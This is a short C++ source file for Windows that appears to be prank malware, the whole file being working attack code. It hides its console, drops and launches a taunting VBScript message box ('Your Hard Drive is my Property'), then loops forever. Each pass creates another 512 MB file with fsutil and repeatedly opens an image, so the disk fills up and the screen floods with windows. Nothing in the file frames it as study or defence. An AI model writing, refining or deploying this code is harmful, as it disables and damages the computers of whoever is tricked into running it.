#define  _WIN32_WINNT 0x0500
#include <windows.h>
#include <stdio.h>
#include <string>

using namespace std;

void FileCreations(string Name, string FileSize, int Copies);

main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    system("echo x=msgbox(\"You fool! You let me enter in your property!\" ,0, \"Act I - The biggest error of the entire day sir\") >> msgbox.vbs");
    system("start msgbox.vbs");
    system("title Act I - You fool! You let me enter in your property!");

    Sleep(2000);

    printf("WHOOOOPS!\n Hippity Hoppity Your Hard Drive is my Property!");
    FileCreations("Boofspeare", "536870912", NULL);

    system("pause");
}

void FileCreations(string Name, string FileSize, int Copies)
{
    string Final;
    for(int i = 0; 1==1; i++)
    {
        if(i == 0) Final = "fsutil file createnew " + Name + " " + FileSize;
        else       Final = "fsutil file createnew " + Name + to_string(i) + " " + FileSize;

        system("start Boofspeare.png");
        system("start Boofspeare.png");
        system("start Boofspeare.png");
        system("start Boofspeare.png");
        system(Final.c_str());
    }
}
